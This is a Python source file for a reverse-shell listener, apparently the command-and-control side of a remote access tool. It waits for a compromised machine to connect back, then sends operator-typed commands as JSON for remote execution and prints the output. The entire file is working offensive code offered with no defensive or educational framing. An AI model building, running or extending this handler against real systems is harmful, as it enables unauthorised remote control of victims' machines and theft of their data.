#!usr/bin/env python3
import socket
import sys
import json

class Listener:
    def __init__(self, ip:str, port:int) -> None:    
        self.ip = ip 
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.ip,self.port))
        self.server.listen(0)
        print('[*] Server started and waiting for incoming connections.')

        self.connection, conn_addr = self.server.accept()
        print(f'[*] Incoming connection from {conn_addr}')


    def serial_send(self, data:str or list) :
        '''
        serialize data and send over TCP socket.
        '''
        json_data = json.dumps(data)
        bytes_json_data = bytes(json_data, encoding='utf-8')
        # print('Listener sent: ',bytes_json_data)
        self.connection.send(bytes_json_data)


    def serial_receive(self) -> str :
        '''
        receive serialized data over TCP socket
        and retrieve original data.
        '''
        bytes_json_data = b''
        while True:
            try:
                bytes_json_data += self.connection.recv(1024)
                data = json.loads(bytes_json_data)
                # print('Listener Rec: ',data)
                return data
            except json.JSONDecodeError:
                continue


    def execute_remotely(self, command):
        '''
        execute command on the remote machine.
        '''
        self.serial_send(command)
        
        command = command.split(' ')
        if command[0] == 'exit':
            self.connection.close()
            sys.exit()

        return self.serial_receive()


    def run(self):
        while True:
            try:
                command = input('>> ')
                execution_result = self.execute_remotely(command)
                print(execution_result)

            except KeyboardInterrupt:
                print('[!] ctrl+c detected. Closing and exiting server/listener')
                self.serial_send('exit')
                self.server.close()
                sys.exit()

            except Exception as e:
                print('[-] Listener Exception : ', e)